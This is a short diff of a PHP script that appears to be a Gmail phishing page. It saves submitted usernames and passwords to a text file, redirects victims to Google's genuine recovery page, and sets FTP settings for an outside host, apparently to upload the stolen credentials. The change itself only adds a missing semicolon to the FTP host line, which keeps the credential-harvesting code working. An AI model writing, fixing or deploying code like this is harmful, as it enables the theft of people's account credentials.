@@ -4,7 +4,7 @@ file_put_contents("usernames.txt", "Gmail Username: " . $_POST['username'] . " P
 header('Location: https://accounts.google.com/signin/v2/recoveryidentifier');
 //check if form is submitted
     // ftp settings
-$host='ftpupload.net'
+$host='ftpupload.net';
 $port= 21;
 $timeout =1;
 $user = 'b12_32676505';
